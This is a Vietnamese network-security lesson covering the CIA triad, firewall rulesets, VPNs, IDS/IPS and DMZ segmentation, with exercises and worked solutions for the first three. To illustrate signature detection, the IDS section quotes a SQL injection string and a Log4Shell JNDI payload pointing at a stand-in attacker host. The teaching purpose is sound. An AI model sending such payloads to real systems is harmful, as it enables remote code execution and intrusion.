# Lesson 01 — An ninh mạng (Network Security)

## Mục tiêu học tập

Sau bài này bạn sẽ:

- Hiểu tam giác CIA (Confidentiality, Integrity, Availability) và cách nó định hướng mọi quyết định bảo mật mạng.
- Phân biệt firewall packet-filter (stateless) và stateful; đọc/viết ruleset thực tế với allow/deny.
- Hiểu VPN tạo "đường hầm mã hóa" qua mạng công cộng; so sánh site-to-site với remote access; biết IPsec và WireGuard ở mức định tính.
- Phân biệt IDS (phát hiện) và IPS (ngăn chặn); nắm signature-based vs anomaly-based; hiểu đánh đổi false positive/negative.
- Thiết kế phân vùng mạng (segmentation) với DMZ; áp dụng defense in depth và least privilege.

## Kiến thức tiền đề

- [Lesson 06 — TLS](../../02-Application-Services/lesson-06-tls/) — mã hóa và xác thực trong TLS rất liên quan khi học VPN.
- Hiểu biết cơ bản về IP, cổng (port), giao thức TCP/UDP là đủ.

---

## 1. Tam giác CIA — nền tảng bảo mật mạng

### 1.1. Ba trụ cột

💡 **Trực giác**: Hãy tưởng tượng bạn gửi hồ sơ ngân hàng qua bưu điện. Ba điều bạn muốn đảm bảo: (1) chỉ người nhận đọc được (bí mật), (2) nội dung không bị sửa dọc đường (toàn vẹn), (3) thư đến đúng hạn (sẵn sàng). Đó chính là CIA.

**Confidentiality (Bí mật)** — Chỉ người được phép mới đọc được dữ liệu.
- Vì sao cần: dữ liệu đi qua nhiều router, có thể bị nghe lén (eavesdropping).
- Ví dụ: mật khẩu gửi qua HTTP thuần (không mã hóa) → bất kỳ thiết bị nào trên đường đều đọc được. Mã hóa TLS giải quyết bằng cách biến plaintext thành ciphertext không đọc được nếu không có khóa.

**Integrity (Toàn vẹn)** — Dữ liệu không bị thay đổi trong quá trình truyền.
- Vì sao cần: kẻ tấn công có thể dùng kỹ thuật man-in-the-middle (MITM) để sửa nội dung gói tin.
- Ví dụ: chuyển khoản 1.000.000 VND, kẻ tấn công sửa thành 10.000.000 VND. HMAC (hash-based message authentication code) phát hiện sửa đổi vì hash thay đổi.

**Availability (Khả dụng)** — Dịch vụ luôn hoạt động khi cần.
- Vì sao cần: tấn công DoS/DDoS (Denial of Service) làm hệ thống quá tải, ngừng phục vụ.
- Ví dụ: DDoS vào server DNS → mọi tên miền không phân giải được → internet "sụp" với người dùng.

### 1.2. Đánh đổi giữa 3 trụ cột

❓ **Câu hỏi tự nhiên của người đọc**:

- "Ba cái này có độc lập không?" — Không. Thường xảy ra đánh đổi: mã hóa mạnh (tăng C) nhưng tốn CPU (giảm A một chút). Firewall quá chặt (tăng C/I) nhưng chặn cả traffic hợp lệ (giảm A).
- "CIA đủ để mô tả mọi mối đe dọa không?" — Hầu hết, nhưng một số framework mở rộng thêm Authentication (xác thực), Authorization (phân quyền), Non-repudiation (chống chối bỏ) → gọi là CIA+AAA hoặc mô hình Parkerian Hexad.
- "Mối đe dọa nào tấn công C, I, A?" — Nghe lén/lộ dữ liệu → C. Giả mạo/sửa gói → I. DDoS/ransomware mã hóa file → A.

### 1.3. Bề mặt tấn công (attack surface)

**Bề mặt tấn công** = tổng hợp tất cả các điểm mà kẻ tấn công có thể cố gắng xâm nhập vào hệ thống.

Gồm 3 loại chính:

| Loại | Ví dụ cụ thể | Cách thu nhỏ |
|------|-------------|--------------|
| **Network attack surface** | Cổng TCP/UDP mở, giao thức không mã hóa, Wi-Fi công khai | Đóng cổng không dùng, dùng TLS, phân vùng VLAN |
| **Software attack surface** | Web app có lỗ hổng, phần mềm lỗi thời, API không xác thực | Vá lỗi (patch), kiểm thử bảo mật, xác thực đầu vào |
| **Human attack surface** | Phishing, social engineering, mật khẩu yếu | Đào tạo bảo mật, xác thực 2 yếu tố (2FA) |

⚠ **Lỗi thường gặp**: Nhiều đội chỉ nghĩ đến network attack surface (firewall, IDS) mà quên software attack surface. Thực tế, phần lớn breach thành công đến từ lỗ hổng phần mềm (SQL injection, XSS) hoặc con người (phishing), không phải xâm nhập trực tiếp qua mạng.

🔁 **Dừng lại tự kiểm tra**: Server web của công ty bị DDoS → trụ cột nào của CIA bị vi phạm?

<details><summary>Đáp án</summary>

**Availability (A)** — server không phục vụ được người dùng hợp lệ. Confidentiality và Integrity không bị vi phạm trực tiếp (dữ liệu không bị đọc hoặc sửa, chỉ bị làm cho không thể tiếp cận).

</details>

📝 **Tóm tắt mục 1**

- CIA: Confidentiality (bí mật), Integrity (toàn vẹn), Availability (khả dụng).
- Ba trụ có thể đánh đổi lẫn nhau; giải pháp bảo mật tốt cân bằng cả 3.
- Bề mặt tấn công = network + software + human; phải thu hẹp cả 3 mặt.

---

## 2. Firewall — kiểm soát luồng traffic mạng

### 2.1. Packet-filter (stateless) — lọc theo bộ tiêu chí

💡 **Trực giác**: Hãy tưởng tượng bảo vệ tòa nhà kiểm tra mỗi người đi vào theo danh sách quy tắc: "đến từ phòng A, đi tới phòng B, được phép". Mỗi người được xét độc lập, không quan tâm người đó đã vào trước đó chưa. Đó là packet-filter.

**Packet-filter firewall** kiểm tra từng gói tin độc lập theo 5-tuple:
- Source IP, Destination IP
- Source Port, Destination Port
- Protocol (TCP/UDP/ICMP)

Mỗi gói khớp rule đầu tiên từ trên xuống → thực hiện hành động (ALLOW/DENY).

**Ví dụ ruleset thực tế** (dạng iptables/ACL):

```
# Rule 1: cho phép HTTP từ mọi IP vào server web 10.0.1.5
ALLOW  src=any  dst=10.0.1.5  dport=80  proto=TCP

# Rule 2: cho phép HTTPS từ mọi IP vào server web
ALLOW  src=any  dst=10.0.1.5  dport=443  proto=TCP

# Rule 3: cho phép SSH chỉ từ mạng quản trị 10.0.2.0/24
ALLOW  src=10.0.2.0/24  dst=any  dport=22  proto=TCP

# Rule 4: chặn mọi traffic vào từ mạng không tin cậy 203.0.113.0/24
DENY   src=203.0.113.0/24  dst=any  proto=any

# Rule 5 (implicit deny): chặn tất cả còn lại
DENY   src=any  dst=any  proto=any
```

**Walk-through gói tin**: Gói đến với `src=10.0.2.5, dst=10.0.1.5, dport=22, TCP`.
1. Khớp Rule 1? Không (dst port 80, gói là 22).
2. Khớp Rule 2? Không (dst port 443, gói là 22).
3. Khớp Rule 3? Có! `src=10.0.2.5` thuộc `10.0.2.0/24`, `dport=22`, `proto=TCP` → **ALLOW**.

**Walk-through gói tin 2**: `src=203.0.113.50, dst=10.0.1.5, dport=22, TCP`.
1. Rule 1? Không.
2. Rule 2? Không.
3. Rule 3? src=203.0.113.50 không thuộc 10.0.2.0/24 → Không.
4. Rule 4? `src=203.0.113.50` thuộc `203.0.113.0/24` → **DENY**.

### 2.2. Stateful firewall — theo dõi trạng thái kết nối

💡 **Trực giác**: Stateful firewall như bảo vệ thông minh hơn — ghi nhớ "người này đã được mời vào phòng A, nên khi họ ra về tôi sẽ cho qua mà không kiểm tra lại từng bước". Họ theo dõi cả "cuộc hành trình" của kết nối, không chỉ từng người riêng lẻ.

**Stateful firewall** duy trì **bảng trạng thái kết nối** (connection tracking table). Với TCP, nó theo dõi:

```
[src_ip:sport → dst_ip:dport | state | timeout]
10.0.1.100:54321 → 93.184.216.34:443 | ESTABLISHED | 300s
10.0.1.101:49152 → 8.8.8.8:53        | UDP_STREAM  | 30s
```

Ưu điểm so với stateless:
- **Cho phép traffic trả về tự động**: không cần rule riêng cho chiều response. Nếu client 10.0.1.100 kết nối ra ngoài port 443, gói reply từ server 93.184.216.34:443 → 10.0.1.100:54321 sẽ được allow tự động vì khớp entry trong bảng.
- **Phát hiện tấn công tinh vi hơn**: gói TCP với RST flag nhưng không có entry trong bảng = gói giả mạo → DROP.
- **Theo dõi số thứ tự**: một số stateful firewall kiểm tra SEQ/ACK number hợp lệ.

❓ **Câu hỏi tự nhiên của người đọc**:

- "Stateful tốt hơn, vậy stateless còn dùng làm gì?" — Stateless nhanh hơn nhiều, dùng ở router/switch lõi mạng với tốc độ hàng chục Gbps nơi stateful quá tốn tài nguyên. Stateless cũng dùng cho ACL trên switch L3.
- "Bảng trạng thái có giới hạn không?" — Có. Tấn công SYN flood tạo hàng triệu kết nối TCP nửa mở → tràn bảng trạng thái → DoS chính firewall. Giải pháp: SYN cookies.
- "Firewall có bảo vệ được layer 7 (HTTP/DNS) không?" — Firewall truyền thống (L3/L4) không kiểm tra nội dung HTTP. Cần Web Application Firewall (WAF) ở layer 7.

### 2.3. Phân biệt Firewall với NAT

⚠ **Lỗi thường gặp**: NAT (Network Address Translation) thường bị nhầm là có tác dụng bảo mật như firewall.

| | Firewall | NAT |
|---|---|---|
| **Mục đích chính** | Kiểm soát luồng traffic theo policy bảo mật | Ánh xạ địa chỉ IP (private ↔ public) |
| **Cơ chế** | Kiểm tra rule, cho phép/chặn gói | Dịch địa chỉ nguồn/đích, không có rule allow/deny |
| **Bảo mật thực sự** | Có — theo policy được cấu hình | Không — chỉ là hiệu ứng phụ (hosts ẩn sau NAT không trực tiếp tiếp cận được) |
| **Ví dụ** | `DENY src=any dst=server dport=3306` | `192.168.1.x → 203.0.113.5` (PAT) |

Router gia đình có NAT không có nghĩa là được bảo vệ bởi firewall — nếu ai đó bypass NAT (qua port forwarding, UPnP tự động mở cổng), traffic vào được mà không có rule nào kiểm tra.

🔁 **Dừng lại tự kiểm tra**: Viết rule firewall để: (1) cho phép DNS từ mọi host trong mạng 192.168.0.0/16 đến server DNS 1.1.1.1, (2) chặn mọi thứ còn lại.

<details><summary>Đáp án</summary>

```
ALLOW  src=192.168.0.0/16  dst=1.1.1.1  dport=53  proto=UDP
ALLOW  src=192.168.0.0/16  dst=1.1.1.1  dport=53  proto=TCP
DENY   src=any  dst=any  proto=any
```

Lưu ý cần cả UDP và TCP cho DNS: truy vấn thường dùng UDP/53, nhưng response > 512 byte (zone transfer, DNSSEC) dùng TCP/53.

</details>

📝 **Tóm tắt mục 2**

- Packet-filter (stateless): kiểm tra từng gói theo 5-tuple, rule từ trên xuống, implicit deny cuối.
- Stateful: theo dõi bảng kết nối, tự động cho phép traffic trả về, phát hiện gói giả mạo tốt hơn.
- NAT không phải firewall: không có policy bảo mật, chỉ dịch địa chỉ.
- Rule thứ tự quan trọng: rule cụ thể hơn đặt trước, rule tổng quát đặt sau.

---

## 3. VPN — đường hầm mã hóa qua mạng công cộng

### 3.1. Vấn đề VPN giải quyết

💡 **Trực giác**: Bạn cần gửi tài liệu mật từ chi nhánh Hà Nội về trụ sở TP.HCM. Bưu điện công cộng (internet) có thể bị người ngoài xem. Giải pháp: bỏ tài liệu vào phong bì chì không nhìn xuyên được (mã hóa), dán niêm phong (toàn vẹn), rồi gửi qua bưu điện bình thường. Người nhận mở ra theo quy trình riêng. Đó là VPN: tạo "đường hầm ảo" an toàn qua internet không an toàn.

**VPN (Virtual Private Network)** mã hóa toàn bộ traffic giữa 2 điểm qua mạng công cộng, đảm bảo:
- **Confidentiality**: dữ liệu mã hóa, ISP/router giữa đường không đọc được.
- **Integrity**: phát hiện sửa đổi gói tin.
- **Authentication**: xác thực 2 đầu hầm (tunnel) là đúng thiết bị/người được phép.

### 3.2. Site-to-site vs Remote access

**Site-to-site VPN**: kết nối 2 mạng công ty với nhau.

```
Văn phòng HN          Internet (không tin cậy)     Trụ sở HCM
[10.1.0.0/24] — [VPN Gateway HN] ====(tunnel)==== [VPN Gateway HCM] — [10.2.0.0/24]
```

- Dùng cho: chi nhánh truy cập tài nguyên trụ sở (máy chủ nội bộ, cơ sở dữ liệu).
- Thiết lập một lần, luôn hoạt động ("always-on").
- Ví dụ thực tế: chuỗi cửa hàng bán lẻ, mỗi chi nhánh có VPN về trung tâm để đồng bộ dữ liệu bán hàng.

**Remote access VPN**: người dùng từ xa kết nối vào mạng công ty.

```
Nhân viên WFH         Internet                   Mạng công ty
[Laptop 192.168.1.x] ===(tunnel)=== [VPN Server] — [10.0.0.0/8]
```

- Sau khi kết nối, laptop được cấp IP thuộc mạng công ty (ví dụ 10.0.50.23).
- Từ đó truy cập được máy chủ nội bộ như khi ngồi tại văn phòng.
- Ví dụ thực tế: nhân viên làm việc từ nhà truy cập hệ thống ERP, máy chủ file nội bộ.

### 3.3. IPsec và WireGuard (định tính)

**IPsec (Internet Protocol Security)**:
- Hoạt động ở lớp mạng (Layer 3), mã hóa và xác thực từng gói IP.
- Hai chế độ: **Transport mode** (chỉ mã hóa payload, giữ IP header gốc) và **Tunnel mode** (mã hóa toàn bộ gói IP gốc, thêm IP header mới — dùng cho VPN gateway-to-gateway).
- Dùng IKE (Internet Key Exchange) để trao đổi khóa.
- Phức tạp khi cấu hình, nhưng là chuẩn được hầu hết thiết bị network (Cisco, Juniper) hỗ trợ.
- Hiệu năng: tốt, nhất là khi có hỗ trợ phần cứng (hardware offload).

**WireGuard**:
- Giao thức VPN hiện đại (tích hợp vào Linux kernel từ 5.6).
- Chỉ ~4.000 dòng code (so với ~400.000 của OpenVPN) → dễ kiểm tra bảo mật, ít bề mặt tấn công.
- Dùng các thuật toán mã hóa hiện đại: Curve25519 (trao đổi khóa), ChaCha20-Poly1305 (mã hóa+xác thực), BLAKE2s (hash).
- Hiệu năng vượt trội: throughput cao hơn OpenVPN/IPsec trong nhiều benchmark.
- Hạn chế: không ẩn được địa chỉ IP của server VPN (dễ nhận dạng hơn IPsec trong một số bối cảnh).

❓ **Câu hỏi tự nhiên của người đọc**:

- "VPN có khiến tốc độ chậm không?" — Có, do overhead mã hóa và đóng gói. Với WireGuard và phần cứng hiện đại, overhead thường < 5%. Với IPsec tunnel mode qua internet có RTT cao, độ trễ tăng thêm 2× RTT của đường hầm.
- "VPN và TLS khác gì nhau?" — TLS bảo vệ ở lớp ứng dụng (chỉ một kết nối cụ thể, ví dụ HTTPS). VPN bảo vệ ở lớp mạng (toàn bộ traffic từ thiết bị). Có thể dùng cả 2: dùng VPN để truy cập mạng nội bộ, đồng thời dùng TLS cho HTTPS bên trong VPN. Xem [Lesson 06 — TLS](../../02-Application-Services/lesson-06-tls/).
- "Split tunneling là gì?" — Cấu hình VPN chỉ route một số traffic qua tunnel (ví dụ chỉ traffic đến 10.0.0.0/8), traffic còn lại đi thẳng ra internet. Giảm tải cho VPN server nhưng giảm bảo mật.

📝 **Tóm tắt mục 3**

- VPN tạo đường hầm mã hóa qua mạng công cộng, bảo đảm C + I + A cho luồng dữ liệu.
- Site-to-site: kết nối 2 mạng tổ chức, always-on. Remote access: người dùng từ xa → mạng công ty.
- IPsec: chuẩn L3, phức tạp, hỗ trợ phần cứng rộng rãi. WireGuard: hiện đại, nhỏ gọn, hiệu năng cao.

---

## 4. IDS/IPS — phát hiện và ngăn chặn xâm nhập

### 4.1. IDS vs IPS

💡 **Trực giác**: IDS như camera an ninh — ghi lại và cảnh báo khi phát hiện bất thường. IPS như bảo vệ đứng tại cửa — vừa quan sát vừa chặn ngay kẻ tình nghi không cho vào. Camera không làm chậm người qua lại, nhưng không ngăn được mối đe dọa. Bảo vệ ngăn được nhưng nếu phán đoán sai, người hợp lệ bị chặn lại.

**IDS (Intrusion Detection System)** — hệ thống phát hiện xâm nhập:
- Giám sát traffic và tạo cảnh báo khi phát hiện dấu hiệu tấn công.
- **Không tự động chặn** — chỉ ghi log và gửi alert cho admin.
- Triển khai ở chế độ **passive** (tap/span port): nhận bản sao traffic, không nằm trên đường đi → không ảnh hưởng hiệu năng, không gây gián đoạn nếu IDS bị lỗi.

**IPS (Intrusion Prevention System)** — hệ thống ngăn chặn xâm nhập:
- Nằm **inline** trên đường đi của traffic (như firewall).
- Khi phát hiện dấu hiệu tấn công: DROP gói tin ngay, reset kết nối, hoặc block IP.
- Hiệu quả hơn IDS nhưng rủi ro hơn: nếu false positive → chặn traffic hợp lệ.

### 4.2. Signature-based vs Anomaly-based

**Signature-based (dựa trên chữ ký)**:
- Giống antivirus: so sánh traffic với cơ sở dữ liệu chữ ký của các tấn công đã biết.
- Ví dụ: phát hiện chuỗi `' OR 1=1 --` trong HTTP request → SQL injection.
- Ví dụ: payload của exploit CVE-2021-44228 (Log4Shell): `${jndi:ldap://evil.com/a}`.
- Ưu điểm: ít false positive, dễ giải thích cảnh báo.
- Nhược điểm: không phát hiện được tấn công mới (zero-day) chưa có chữ ký.

**Anomaly-based (dựa trên bất thường)**:
- Xây dựng baseline (đường cơ sở) về hành vi bình thường của mạng, rồi cảnh báo khi có độ lệch lớn.
- Ví dụ: server mail thường gửi 1.000 email/giờ; đột ngột gửi 50.000/giờ → nghi ngờ bị compromise và dùng làm relay spam.
- Ví dụ: host trong mạng nội bộ đột ngột quét (scan) hàng nghìn IP → nghi ngờ lateral movement.
- Ưu điểm: phát hiện được tấn công mới, APT (Advanced Persistent Threat).
- Nhược điểm: nhiều false positive (sự kiện bất thường không nhất thiết là tấn công: tháng cuối năm traffic tăng vọt do kiểm kê, cũng "bất thường").

### 4.3. False positive và False negative — đánh đổi quan trọng

| | Thực tế: Tấn công | Thực tế: Bình thường |
|---|---|---|
| **Hệ thống cảnh báo** | True Positive (TP) — đúng | False Positive (FP) — sai cảnh báo |
| **Hệ thống không cảnh báo** | False Negative (FN) — bỏ sót | True Negative (TN) — đúng |

**False Positive (FP)** — cảnh báo nhầm:
- Hậu quả: admin "cảnh báo mệt mỏi" (alert fatigue) → bỏ qua cả cảnh báo thật. Nếu IPS: chặn traffic hợp lệ → dịch vụ bị gián đoạn.
- Ví dụ: hệ thống IPS chặn gói tin scan từ team nội bộ đang kiểm tra bảo mật.

**False Negative (FN)** — bỏ sót tấn công:
- Hậu quả: kẻ tấn công xâm nhập không bị phát hiện → breach kéo dài (trung bình 197 ngày mới phát hiện theo IBM Cost of Data Breach Report 2023).
- Ví dụ: tấn công APT dùng traffic HTTPS bình thường để exfiltrate dữ liệu → anomaly-based không đủ nhạy để phát hiện.

⚠ **Lỗi thường gặp**: Điều chỉnh ngưỡng IPS quá nhạy để "bắt hết" → tăng FP, admin kiệt sức, cuối cùng tắt cảnh báo. Ngược lại, quá ít nhạy → FN nhiều, bỏ sót tấn công thật. Phải tune carefully dựa trên môi trường cụ thể.

🔁 **Dừng lại tự kiểm tra**: Bạn chọn IDS hay IPS cho môi trường sau: hệ thống thanh toán trực tuyến với yêu cầu uptime 99.99%, traffic có pattern rõ ràng và nhóm bảo mật đủ lực để xử lý cảnh báo?

<details><summary>Đáp án</summary>

**IDS** phù hợp hơn trong trường hợp này, vì: (1) uptime 99.99% đòi hỏi không được chặn traffic hợp lệ (FP của IPS cực kỳ đắt giá), (2) nhóm bảo mật đủ lực xử lý cảnh báo, (3) pattern traffic rõ ràng giúp giảm FP. Có thể kết hợp: IDS cho production, IPS cho môi trường kém quan trọng hơn để thu thập kinh nghiệm tune rule trước.

</details>

📝 **Tóm tắt mục 4**

- IDS: passive, phát hiện + cảnh báo, không chặn. IPS: inline, chặn ngay.
- Signature-based: ít FP, không bắt zero-day. Anomaly-based: bắt được mới, nhiều FP.
- FP vs FN là đánh đổi cốt lõi; phải tune theo môi trường cụ thể.

---

## 5. Phân vùng mạng (Network Segmentation)

### 5.1. Tại sao phải phân vùng?

💡 **Trực giác**: Trong trụ sở ngân hàng, bạn không cho khách hàng vào thẳng phòng kho tiền. Có khu vực sảnh chờ (public), quầy giao dịch (semi-trusted), và kho tiền (highly restricted). Mỗi vùng có kiểm soát riêng. Đó là ý tưởng phân vùng mạng.

**Vấn đề với mạng phẳng (flat network)**: Nếu mọi thiết bị đều ở cùng một subnet, khi kẻ tấn công compromise được 1 máy (ví dụ: máy tính của nhân viên bị malware) → có thể tự do "di chuyển ngang" (lateral movement) đến máy chủ cơ sở dữ liệu, máy chủ thanh toán, v.v.

**Phân vùng mạng** chia mạng thành các vùng riêng biệt với firewall và ACL kiểm soát giữa các vùng, giới hạn thiệt hại nếu một vùng bị tấn công.

### 5.2. DMZ — vùng phi quân sự

**DMZ (Demilitarized Zone)** là vùng mạng đặt giữa mạng nội bộ (internal) và internet, chứa các server cần tiếp nhận kết nối từ internet (web server, mail server, DNS server công khai).

```
Internet
    |
[Firewall ngoài]
    |
   DMZ (10.0.1.0/24)
   ├── Web Server (10.0.1.10)
   ├── Mail Server (10.0.1.20)
   └── DNS Server (10.0.1.30)
    |
[Firewall trong]
    |
 Internal (10.0.2.0/24)
 ├── DB Server (10.0.2.10)
 ├── App Server (10.0.2.20)
 └── Workstations (10.0.2.100-200)
```

**Ruleset điển hình**:
```
# Firewall ngoài: internet → DMZ
ALLOW  src=any  dst=10.0.1.10  dport=80,443  proto=TCP   # HTTP/HTTPS vào web
ALLOW  src=any  dst=10.0.1.20  dport=25,587  proto=TCP   # SMTP vào mail
DENY   src=any  dst=10.0.2.0/24  proto=any               # Không vào thẳng internal

# Firewall trong: DMZ → internal
ALLOW  src=10.0.1.10  dst=10.0.2.10  dport=5432  proto=TCP  # Web → DB (PostgreSQL)
ALLOW  src=10.0.1.20  dst=10.0.2.20  dport=8080  proto=TCP  # Mail → App Server
DENY   src=10.0.1.0/24  dst=any  proto=any                   # DMZ không tự do vào internal
```

Lý do DMZ giảm rủi ro: nếu web server bị compromise, kẻ tấn công chỉ có thể làm gì trong DMZ. Để tiếp cận database ở internal, phải vượt qua thêm firewall trong — khó hơn nhiều.

### 5.3. Defense in Depth và Least Privilege

**Defense in Depth (Phòng thủ nhiều lớp)** — nguyên tắc: không dựa vào một lớp bảo mật duy nhất. Xếp chồng nhiều lớp kiểm soát, để nếu một lớp thất bại, lớp tiếp theo vẫn chặn được.

```
Lớp 1: Perimeter firewall       — chặn traffic trái phép từ internet
Lớp 2: DMZ + firewall trong     — cô lập server public khỏi internal
Lớp 3: IDS/IPS                  — phát hiện/chặn tấn công đã qua firewall
Lớp 4: Mã hóa (TLS, VPN)        — bảo vệ dữ liệu kể cả khi bị nghe lén
Lớp 5: Xác thực mạnh (MFA)      — ngăn kẻ dùng credential bị đánh cắp
Lớp 6: Endpoint security        — antivirus, EDR trên từng máy
Lớp 7: Backup & recovery        — khôi phục khi mọi lớp đã thất bại
```

⚠ **Lỗi thường gặp**: Nghĩ rằng có firewall là đủ. Thực tế: firewall chỉ là lớp 1. Nếu attacker có credential hợp lệ (phishing thành công), firewall không chặn được gì.

**Principle of Least Privilege (Đặc quyền tối thiểu)** — nguyên tắc: mỗi thực thể (user, service, máy chủ) chỉ được cấp đúng quyền tối thiểu cần thiết để thực hiện chức năng của mình.

Áp dụng trong mạng:
- Web server chỉ được phép kết nối đến database server trên port 5432 — không phải toàn bộ mạng internal.
- Service account chạy web app chỉ có quyền đọc/ghi bảng dữ liệu cần thiết, không phải `root` hay `db_owner`.
- Workstation nhân viên không cần truy cập server lương — cấm trong firewall rule.

Ví dụ cụ thể: trong ruleset DMZ ở trên, `ALLOW src=10.0.1.10 dst=10.0.2.10 dport=5432` là least privilege — web server chỉ nói chuyện được với DB server trên đúng port PostgreSQL, không hơn không kém.

❓ **Câu hỏi tự nhiên của người đọc**:

- "Phân vùng có làm mạng phức tạp hơn không?" — Có. Thêm firewall, VLAN, ACL cần quản lý. Đây là lý do nhiều doanh nghiệp nhỏ bỏ qua và chỉ có flat network — nhưng khi xảy ra breach, tổn thất thường lớn hơn nhiều chi phí phức tạp hóa ban đầu.
- "Micro-segmentation là gì?" — Phân vùng đến mức từng workload/container, không chỉ theo subnet. Ví dụ: mỗi microservice chỉ được phép giao tiếp với service cụ thể theo danh sách whitelist. Phổ biến trong môi trường cloud-native (Kubernetes NetworkPolicy, service mesh).
- "VLAN có phải phân vùng bảo mật không?" — VLAN tạo cô lập ở L2 (tầng data link) nhưng không phải bảo mật thật sự — VLAN hopping attack có thể bypass. Phải kết hợp VLAN với firewall L3 mới đảm bảo.

🔁 **Dừng lại tự kiểm tra**: Server cơ sở dữ liệu khách hàng nên đặt ở vùng nào: DMZ hay Internal? Vì sao?

<details><summary>Đáp án</summary>

**Internal** — Database chứa dữ liệu nhạy cảm, không bao giờ cần tiếp nhận kết nối trực tiếp từ internet. Chỉ web server hoặc app server (qua firewall trong) mới cần truy cập database. Đặt ở DMZ sẽ phơi bày database trực tiếp với rủi ro từ internet nếu firewall ngoài bị bypass.

</details>

📝 **Tóm tắt mục 5**

- Phân vùng mạng giới hạn lateral movement khi một vùng bị compromise.
- DMZ: vùng trung gian chứa server public, được bảo vệ bởi 2 tầng firewall.
- Defense in depth: xếp chồng nhiều lớp kiểm soát, không phụ thuộc một lớp.
- Least privilege: cấp quyền tối thiểu, giảm thiệt hại khi bị tấn công.

---

## Bài tập + Lời giải chi tiết

### Bài tập

**Bài 1**: Đọc ruleset sau và cho biết gói tin nào được phép, gói nào bị chặn. Giải thích tại sao.

```
Rule 1: ALLOW  src=10.0.0.0/8  dst=any  dport=80  proto=TCP
Rule 2: ALLOW  src=10.0.0.0/8  dst=any  dport=443  proto=TCP
Rule 3: DENY   src=10.0.5.0/24  dst=any  proto=any
Rule 4: ALLOW  src=any  dst=10.0.1.100  dport=22  proto=TCP
Rule 5: DENY   src=any  dst=any  proto=any
```

Gói (a): `src=10.0.5.15, dst=8.8.8.8, dport=80, TCP`
Gói (b): `src=10.0.1.50, dst=8.8.8.8, dport=443, TCP`
Gói (c): `src=203.0.113.1, dst=10.0.1.100, dport=22, TCP`
Gói (d): `src=10.0.5.15, dst=10.0.1.100, dport=22, TCP`

**Bài 2**: Viết ruleset firewall cho yêu cầu sau:
- Server web 172.16.1.10 nhận HTTP/HTTPS từ mọi nơi.
- Chỉ admin network 172.16.100.0/24 mới được SSH vào mọi server.
- Database server 172.16.2.50 chỉ được truy cập từ server web trên port 3306 (MySQL).
- Tất cả traffic khác bị chặn.

**Bài 3**: Phân tích tình huống: Công ty A có kiến trúc mạng phẳng (flat), tất cả 500 máy tính nhân viên và 10 server đều trong cùng subnet 10.0.0.0/16. Một nhân viên bị phishing, máy tính bị cài ransomware. Mô tả điều gì xảy ra tiếp theo và đề xuất cách cải thiện kiến trúc.

**Bài 4**: Bạn cần triển khai VPN cho 2 tình huống:
- (a) 200 nhân viên làm việc từ xa, kết nối vào hệ thống nội bộ.
- (b) Kết nối chi nhánh Đà Nẵng (mạng 192.168.2.0/24) với trụ sở HN (mạng 10.1.0.0/16).

Chọn loại VPN phù hợp cho mỗi tình huống và giải thích.

**Bài 5**: IPS của công ty B cảnh báo 50.000 alert/ngày, trong đó admin ước tính 95% là false positive. Admin quyết định tắt hầu hết rules để giảm noise. Nhận xét vấn đề và đề xuất cách tiếp cận đúng.

**Bài 6**: Thiết kế phân vùng mạng cho một công ty thương mại điện tử với các thành phần: web server (nhận traffic internet), application server (xử lý đơn hàng), database server (chứa thông tin khách hàng và thẻ tín dụng), mail server (gửi thông báo đơn hàng), workstation nhân viên. Vẽ sơ đồ vùng và firewall rule chính.

---

### Lời giải chi tiết

**Bài 1 — Đọc ruleset**:

Gói (a): `src=10.0.5.15, dst=8.8.8.8, dport=80, TCP`
- Rule 1: src=10.0.5.15 thuộc 10.0.0.0/8 — THỎA. dport=80 — THỎA. proto=TCP — THỎA.
- Nhưng khoan — Rule 3: `src=10.0.5.0/24` — 10.0.5.15 thuộc 10.0.5.0/24 — THỎA → DENY.
- Rule nào khớp trước? **Rule 1 khớp trước Rule 3** (thứ tự từ trên xuống) → **ALLOW**.
- Lưu ý: đây là thiết kế tệ — Rule 3 muốn chặn 10.0.5.0/24 nhưng Rule 1 đã cho qua trước. Cần đặt Rule 3 lên trước Rule 1 hoặc thêm exception.

Gói (b): `src=10.0.1.50, dst=8.8.8.8, dport=443, TCP`
- Rule 1: dport=80, gói có dport=443 → không khớp.
- Rule 2: src=10.0.1.50 thuộc 10.0.0.0/8, dport=443, TCP → **ALLOW**.

Gói (c): `src=203.0.113.1, dst=10.0.1.100, dport=22, TCP`
- Rule 1: src=203.0.113.1 không thuộc 10.0.0.0/8 → không khớp.
- Rule 2: không khớp.
- Rule 3: src không thuộc 10.0.5.0/24 → không khớp.
- Rule 4: dst=10.0.1.100 — THỎA. dport=22 — THỎA. proto=TCP — THỎA → **ALLOW**.
- (Rule 4 cho phép SSH vào 10.0.1.100 từ mọi IP — có thể là lỗ hổng bảo mật!)

Gói (d): `src=10.0.5.15, dst=10.0.1.100, dport=22, TCP`
- Rule 1: dport=80, gói có dport=22 → không khớp.
- Rule 2: dport=443 → không khớp.
- Rule 3: src=10.0.5.15 thuộc 10.0.5.0/24 → **DENY**.

**Bài 2 — Viết ruleset**:

```
# Web server nhận HTTP/HTTPS từ mọi nơi
ALLOW  src=any           dst=172.16.1.10    dport=80   proto=TCP
ALLOW  src=any           dst=172.16.1.10    dport=443  proto=TCP

# Chỉ admin network SSH vào mọi server
ALLOW  src=172.16.100.0/24  dst=any        dport=22   proto=TCP

# Database chỉ từ web server trên port MySQL
ALLOW  src=172.16.1.10   dst=172.16.2.50   dport=3306 proto=TCP

# Implicit deny tất cả còn lại
DENY   src=any           dst=any           proto=any
```

Lưu ý: thứ tự quan trọng. Rule cụ thể (web server → DB) phải trước rule tổng quát.

**Bài 3 — Phân tích flat network breach**:

Kịch bản khi bị ransomware trên flat network:
1. Ransomware trên máy nhân viên quét toàn bộ subnet 10.0.0.0/16 (65.534 địa chỉ).
2. Phát hiện tất cả server trên cùng subnet, truy cập được bằng SMB, RDP, NFS mà không qua firewall nào.
3. Lây lan sang 10, 50, rồi toàn bộ 500 máy tính và 10 server.
4. Mã hóa tất cả file chia sẻ trên server.
5. Thiệt hại: toàn bộ dữ liệu công ty bị mã hóa, hoạt động ngừng hoàn toàn.

Đề xuất cải thiện:
```
Phân vùng:
- Vùng nhân viên (workstations):  10.0.1.0/24
- Vùng server nội bộ (ERP, file): 10.0.2.0/24
- Vùng server quan trọng (DB):    10.0.3.0/24
- Vùng DMZ (web, mail):           10.0.4.0/24

Kiểm soát giữa vùng:
- Workstations → Server: chỉ port cần thiết (SMB 445, RDP 3389 qua jump server)
- Workstations → DB: DENY hoàn toàn
- Server → DB: chỉ port ứng dụng (3306, 5432)
```

